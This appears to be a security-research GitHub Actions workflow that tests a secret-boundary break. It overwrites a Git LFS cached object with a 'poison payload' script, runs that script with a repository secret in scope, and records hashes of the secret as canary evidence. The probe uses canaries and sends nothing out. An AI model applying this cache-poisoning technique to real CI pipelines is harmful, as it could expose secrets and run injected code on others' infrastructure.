name: "PoC Aggressive - Secret Boundary Break CH-004"

on:
  workflow_dispatch:
  push:
    paths:
      - '.github/workflows/poc-aggressive-ch004.yml'

jobs:
  aggressive-secret-test:
    runs-on: ubuntu-latest
    env:
      AGGRESSIVE_CANARY: "CANARY_DISPATCH_${{ github.run_id }}"

    steps:
      - name: Checkout with LFS
        uses: actions/checkout@v4
        with:
          lfs: true
          fetch-depth: 1

      - name: Verify Environment
        run: |
          set -euo pipefail
          git --version
          git lfs version
          echo "RUN_ID=${{ github.run_id }}"
          echo "REPOSITORY=${{ github.repository }}"

      - name: Extract LFS OID
        id: extract-oid
        run: |
          set -euo pipefail
          OID=$(git lfs ls-files --json 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); files=d.get('files',d.get('Files',[])); print(files[0]['oid'] if files else 'NOT_FOUND')" || echo "NOT_FOUND")
          echo "pointer_oid=$OID" >> "$GITHUB_OUTPUT"
          echo "Extracted OID: ${OID:0:16}..."

      - name: Create and Inject Poison Payload
        if: steps.extract-oid.outputs.pointer_oid != 'NOT_FOUND'
        run: |
          set -euo pipefail
          OID="${{ steps.extract-oid.outputs.pointer_oid }}"
          cat > /tmp/aggressive-payload.sh <<'PAYLOAD_EOF'
          #!/bin/bash
          set -euo pipefail
          CANARY_FILE="/tmp/aggressive_canary_$(date +%s)_$$_${GITHUB_RUN_ID:-unknown}"
          echo "CANARY_VERIFIED_$(date -u +%Y-%m-%dT%H:%M:%SZ)" > "$CANARY_FILE"
          echo "PID=$$" >> "$CANARY_FILE"
          echo "RUN_ID=${GITHUB_RUN_ID:-unknown}" >> "$CANARY_FILE"
          echo "REPOSITORY=${GITHUB_REPOSITORY:-unknown}" >> "$CANARY_FILE"
          echo "RUNNER_NAME=${RUNNER_NAME:-unknown}" >> "$CANARY_FILE"
          if [ -n "${AGGRESSIVE_SECRET:-}" ]; then
            SHA256_HASH=$(echo -n "$AGGRESSIVE_SECRET" | sha256sum | cut -d' ' -f1)
            echo "SECRET_SHA256=$SHA256_HASH" >> "$CANARY_FILE"
            if command -v b3sum &>/dev/null; then
              BLAKE3_HASH=$(echo -n "$AGGRESSIVE_SECRET" | b3sum | cut -d' ' -f1)
              echo "SECRET_BLAKE3=$BLAKE3_HASH" >> "$CANARY_FILE"
            else
              SHA384_HASH=$(echo -n "$AGGRESSIVE_SECRET" | sha384sum | cut -d' ' -f1)
              echo "SECRET_SHA384=$SHA384_HASH" >> "$CANARY_FILE"
            fi
          fi
          echo "AGGRESSIVE_POC_COMPLETE" >> "$CANARY_FILE"
          exit 0
          PAYLOAD_EOF
          OBJ_PATH=".git/lfs/objects/${OID:0:2}/${OID:2:2}/$OID"
          mkdir -p "$(dirname "$OBJ_PATH")"
          cp /tmp/aggressive-payload.sh "$OBJ_PATH"
          INJECTED_SHA=$(sha256sum "$OBJ_PATH" | cut -d' ' -f1)
          echo "Injected payload SHA256: ${INJECTED_SHA:0:16}..."

      - name: Execute Poisoned LFS Object
        env:
          AGGRESSIVE_SECRET: ${{ secrets.TEST_SECRET_AGGRESSIVE }}
        run: |
          set -eo pipefail
          OID="${{ steps.extract-oid.outputs.pointer_oid }}"
          OBJ_PATH=".git/lfs/objects/${OID:0:2}/${OID:2:2}/$OID"
          if [ -f "$OBJ_PATH" ]; then
            bash "$OBJ_PATH"
            echo "Executed poisoned cache object successfully"
          else
            echo "ERROR: Cache object not found at $OBJ_PATH"
            find .git/lfs/objects -type f 2>/dev/null | sort || true
          fi

      - name: Collect Forensic Evidence
        if: always()
        run: |
          set -eo pipefail
          python3 -c "
          import json, hashlib, os, glob
          from datetime import datetime, timezone
          evidence = {
            'run_id': os.environ.get('GITHUB_RUN_ID', 'unknown'),
            'scenario': 'aggressive-secret-boundary-break-ch004',
            'timestamp_utc': datetime.now(timezone.utc).isoformat(),
            'canary_files': [],
            'verdict': 'INCONCLUSIVE',
            'security_cert': 'NO_SECRET_LOGGED_IN_PLAINTEXT'
          }
          for f in sorted(glob.glob('/tmp/aggressive_canary_*')):
            try:
              with open(f, 'r') as fh:
                content = fh.read()
              evidence['canary_files'].append({
                'filename': os.path.basename(f),
                'content_hash_sha256': hashlib.sha256(content.encode()).hexdigest(),
                'contains_canary': 'CANARY_VERIFIED' in content,
                'contains_sha256': 'SECRET_SHA256=' in content,
                'contains_blake3_or_sha384': 'SECRET_BLAKE3=' in content or 'SECRET_SHA384=' in content,
                'contains_run_id': os.environ.get('GITHUB_RUN_ID', 'unknown') in content,
              })
            except Exception as e:
              evidence['canary_files'].append({'filename': os.path.basename(f), 'error': str(e)})
          if evidence['canary_files'] and all(
            cf.get('contains_canary') and cf.get('contains_sha256') and cf.get('contains_blake3_or_sha384')
            for cf in evidence['canary_files']
          ):
            evidence['verdict'] = 'CONFIRMED'
          print(json.dumps(evidence, indent=2))
          with open('aggressive-ch004-result.json', 'w') as f:
            json.dump(evidence, f, indent=2)
          "

      - name: Upload Evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: aggressive-ch004-evidence-${{ github.run_id }}
          path: |
            aggressive-ch004-result.json
            /tmp/aggressive_canary_*
          retention-days: 90
